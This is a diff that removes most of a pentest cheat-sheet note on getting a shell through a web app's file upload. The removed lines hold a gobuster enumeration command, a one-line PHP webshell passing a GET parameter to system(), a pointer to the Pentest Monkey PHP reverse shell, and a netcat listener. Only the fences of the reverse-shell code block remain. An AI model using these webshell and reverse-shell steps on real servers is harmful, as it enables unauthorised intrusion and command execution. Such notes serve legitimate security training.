@@ -1,20 +1,3 @@
-2 ways to achieve :
-- Webshells
-- Reverse / Bind Shell
-
-1 - Use gobuster to find directory in the webapp
-```gobuster dir -u [url] -w [word_list]```
- After seeing that image a uploaded to a directory you can try to upload some php code :
- ```php
-<?php
-    echo system($_GET["cmd=id;whoami;ls"]);
-?>
-```
-
-----
-
-Or with a Reverse Shell:
-Use Ubiquitous Pentest Monkey Reverse Shell:
 ```php
 <?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
@@ -206,10 +189,3 @@ function printit ($string) {
 
 ?>
 ```
-
-Listen on nc on port 1234:
-`nc -lvnp 1234`
-
-In the directory that files are uploaded on the website (http://[url]/[directory] )
-Click on the .php file & enjoy!
-
